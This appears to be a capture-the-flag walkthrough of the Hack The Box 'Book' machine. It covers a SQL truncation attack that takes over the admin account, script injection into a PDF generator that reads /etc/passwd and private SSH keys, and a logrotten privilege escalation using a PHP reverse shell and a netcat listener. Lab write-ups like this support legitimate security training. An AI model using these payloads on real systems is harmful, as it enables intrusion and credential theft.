<div class="figure">
<img src="/img/htb_book/card.png" width="100%" style="max-width: 600px" height=""/>
</div>

<div>
    <h1>Nmap</h1>
    <p>Let's scan for any open ports!</p>
    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nmap -sV -sC -T4 -p- 10.10.10.176</span></code></pre></div>
    <center><img src="/img/htb_book/0.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>As we can see. Port 22 for SSH is open and Port 80 for an Apache webserver is also open.</p>

    <h1>Finding Directories</h1>
    <center><img src="/img/htb_book/0.5.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>Nothing too important. All are restricted or require a login</p>
    <p>Let's go to the webserver and see if we can get anything!</p>

    <h1>Our findings</h1>

    <center><img src="/img/htb_book/1.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>Once we go to the webpage, we're greeted with a login page. Since we don't have a user account we can create an account
    and sign in with it</p>
    <center><img src="/img/htb_book/2.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>Once we've logged in, we see this very basic homepage. After looking around quite a bit, I see two things that stand out to me:</p>

    <center><img src="/img/htb_book/3.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>This was the first thing that stood out to me within inspecting the pages was a contact page. The email shows admin@book.htb 
    meaning there is an admin account. We may have to find a way to access it.</p>
    <br>

    <p>I also notice this piece of code that stood out to me:</p>
    <div class="sourceCode"><pre class="sourceCode javascript"><code class="sourceCode bash"><span class="ex">
            if (document.location.search.match(/type=embed/gi)) {
              window.parent.postMessage("resize", "*");
            }
          function validateForm() {
            var x = document.forms["myForm"]["name"].value;
            var y = document.forms["myForm"]["email"].value;
            if (x == "") {
              alert("Please fill name field. Should not be more than 10 characters");
              return false;
            }
            if (y == "") {
              alert("Please fill email field. Should not be more than 20 characters");
              return false;
            }
          }
    </span></code></pre></div>

    <p>This code shows that your name field can't be more than 10 characters and the email can't be more than 20 characters.</p>
    <br>
    <p>Now, with this limit we could try and exploit it to change an admin account password using a SQL Truncation Attack. 
    How this attack works is within the database and how the server parses special characters such as spaces. Let's say 
    if you register with an email like this:</p>

    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">admin@admin.com                    s</span></code></pre></div>

    <p>If the email space has a limit like ours. What would happen is it would check if any user has registered with 
    the same email and if nobody has, it's going to cut up the email (since you've passed the character limit) and it's
    going to delete the spaces (if it's a MySQL Database) and saves the entry. If we put so and so together. We know
    that we have to get the admin account using a SQL Truncation Attack</p>

    <h1>Getting an admin account</h1>
    <p>What we need to do is logout of the page. Launch burpsuite since we aren't able to send the details through the normal login. So let's
    open burpsuite and intercept the request for when you login to 10.10.10.176/index.php</p>

    <p>Once you do that, you should get something like this:</p>
    <center><img src="/img/htb_book/4.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>Now we need to copy this to requests and change the very last bit to something like this:</p>
    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">name=admin&email=admin@book.htb                    s&password=12345678</span></code></pre></div>
    <p>Now press Send!</p>

    <center><img src="/img/htb_book/5.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>
    <p>If you get something like. You officially have changed the admin password to whatever you put in password=</p>

    <p>I successfully managed to login with admin creds on /index.php but nothing changed. Then i remember from the dirb
    scan that there was a /admin directory. Let's go to it and login with our admin creds!</p>

    <center><img src="/img/htb_book/6.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>Well this is unfortunate. Here's how to fix it:</p>
    <p>Go to 10.10.10.176/index.php, click signup, set the info to whatever you like but before you press the "SIGN UP"
    button. Intercept the request with burpsuite. Once you do that, it should look like this:</p>

    <center><img src="/img/htb_book/7.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    Copy all of that and go to the repeater tab then change the very last line to this:

    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">name=admin&email=admin@book.htb                    s&password=12345678</span></code></pre></div>

    <p>After that, send the request. You should get this response:</p>

    <center><img src="/img/htb_book/8.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>Once this happens, go to 10.10.10.176/admin and login with the admin email and the password (which is 12345678) </p>

    <center><img src="/img/htb_book/9.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>It worked!</p>

    <h1>Enumerating with admin creds</h1>


    <p>While looking around, I noticed that in Collections has 2 PDF's. One with the registered users and another with the
    books that were submitted here:</p>

    <center><img src="/img/htb_book/10.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>I tried submitting a book and downloaded the collection's PDF file.</p>

    <center><img src="/img/htb_book/11.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>I downloaded it and noticed that my submission was in here. Then i realised that this PDF file was updated whenever 
    we submit a book. What if we can control the input of it somehow.</p>

    <p>I tried multiple things but then an XSS attack worked for me. Here's how to do it:</p>

    <p>Open a new tab and go to 10.10.10.176/index.php and login. Then go to Collections. Then fill the boxes next to 
    Book Title and Author with this:</p>

    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd");x.send();&lt;/script&gt;</span></code></pre></div>

    <p>For the browse section. Add any file you like, that bit doesn't really matter but you must add something.</p>

    <p>After doing all of that, click upload and you should get something like this:</p>

    <center><img src="/img/htb_book/12.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>After this, go to the admin panel and go to collections. After that, click PDF next to Collections. 
    It should download a PDF. After that, open the PDF file. You should get something like this:</p>

    <center><img src="/img/htb_book/13.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>Our XSS attack worked!</p>

    <h1>Getting user</h1>

    <p>We notice a user called reader. After many attempts. I realised that I could try and change the output to give me an
    ssh key for the reader user. We can do it like this:</p>

    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();&lt;/script&gt;</span></code></pre></div>

    <p>Let's try it out and download the pdf!</p>

    <center><img src="/img/htb_book/14.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

    <p>We got it! But there's a problem...</p>

    <p>The key doesn't work for some reason since it doesn't fully output it. Here's how to fix it:</p>

    <p>Download chrome or chromium and then open the pdf file in chrome. After that, select all of it and there you have your 
    ssh key!</p>

<p>Once you've gotten the ssh key. Login to reader using that key like so:</p>

<center><img src="/img/htb_book/15.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

<p>We're in! We officially have user!</p>


<h1>Enumerating with user</h1>

<p>If we launch pspy we see a strange process called logrotate. It also stops every 5 seconds.</p>

<center><img src="/img/htb_book/16.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

<p>After a bit of research, I found an exploit for logrotate <a href="https://github.com/whotwagner/logrotten">here</a></p>

<p>Finding out more about this, I realised that this is an exploit for privilege escalation if a user has write access
within a log file being used by logrogate. This works since logrogate is being executed as root. Our goal here is to
get root using logrotten that will execute a reverse shell being picked up by logrogate.</p>

<p>Lets get to work!</p>

<h1>Getting root</h1>

<p>Compile logrotten (gcc logrotten.c -o logrotten) on your machine. Then launch a http webserver:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">sudo python3 -m http.server 80</small></span></code></pre></div>

<p>and on the ssh session go to the backups folder then install logrotten from your webserver:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">wget http://&lt;YOUR IP&gt;/logrotten</small></span></code></pre></div>

<p>Once you've done that, make a file called root in the ssh session and then put this inside the file:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">php -r '$sock=fsockopen("10.10.*.*",4444);exec("/bin/bash -i <&3 >&3 2>&3");'</small></span></code></pre></div>

<p><strong>Make sure to change the ip to your tun0 ip (the ip you use for hackthebox)</strong></p>

<p>Once you've done that. Save the file and mark it as an executable (chmod +x root)</p>

To launch it. You must do this on the ssh session:

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">./logrotten -p ./root /home/reader/backups/access.log</small></span></code></pre></div>

<p>Once you've done this. Load up two more terminals</p>

<p>In the first terminal you should load up a netcat session like this:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc -lvnp 4444</small></span></code></pre></div>

<p>In the second terminal. SSH into reader and cd into backups. Then do this command:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">echo "test" >> access.log</small></span></code></pre></div>

<p>What these will all do is it will notice a change in access.log and then it will execute whatever logrotten has said to
which in our case. Is the reverse shell.</p>

<p>You won't get the reverse shell at the start so you need to execute the commands again in both the ssh sessions until
you get the reverse shell (make sure to do the logrotten command first)</p>

<p>Once you get the shell quickly do this command  to get the ssh key for root as the shell will go away in 5 seconds:</p>

<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">cat /root/.ssh/id_rsa</small></span></code></pre></div>

<p>If everything is done successfully, you should get something like this:</p>

<center><img src="/img/htb_book/18.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

<p>We got the root ssh key! Let's try it out!</p>

<center><img src="/img/htb_book/19.png" alt="" width="100%" style="max-width: 600px" height=""/></center></a>

<p><center>We got root! I hope this helped you on your journey to getting root on book!</center></p>
